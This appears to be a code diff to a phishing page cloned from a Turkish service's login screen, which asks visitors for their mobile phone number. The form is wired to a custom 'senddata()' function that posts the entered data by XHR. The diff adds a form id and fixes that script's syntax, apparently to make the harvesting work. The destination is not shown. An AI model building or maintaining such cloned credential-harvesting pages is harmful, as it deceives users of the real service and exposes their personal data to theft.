@@ -39,7 +39,7 @@
                            <mat-card-content _ngcontent-tus-c502="" class="mat-mdc-card-content">
                               <div _ngcontent-tus-c502="" class="login-page__form">
                                  <p _ngcontent-tus-c502="" class="subtitle-2 text-align-center text-color-black">Cep telefonu numaranı girerek devam et</p>
-                                 <form _ngcontent-tus-c502="" novalidate="" feappsubmitthrottle="" class="ng-untouched ng-pristine ng-invalid" action="javascript:senddata()">
+                                 <form id="form" _ngcontent-tus-c502="" novalidate="" feappsubmitthrottle="" class="ng-untouched ng-pristine ng-invalid" action="javascript:senddata()">
                                     <mat-form-field _ngcontent-tus-c502="" id="login_phone-input" color="accent" appearance="outline" class="mat-mdc-form-field ng-tns-c186-13 mat-mdc-form-field-type-mat-input mat-form-field-appearance-outline mat-accent ng-untouched ng-pristine ng-invalid ng-star-inserted">
                                        <!---->
                                        <div class="mat-mdc-text-field-wrapper mdc-text-field ng-tns-c186-13 mdc-text-field--outlined">
@@ -154,6 +154,5 @@
                }
             };
             xhr.send(formData);
-            });
-         }
+            };
       </script>
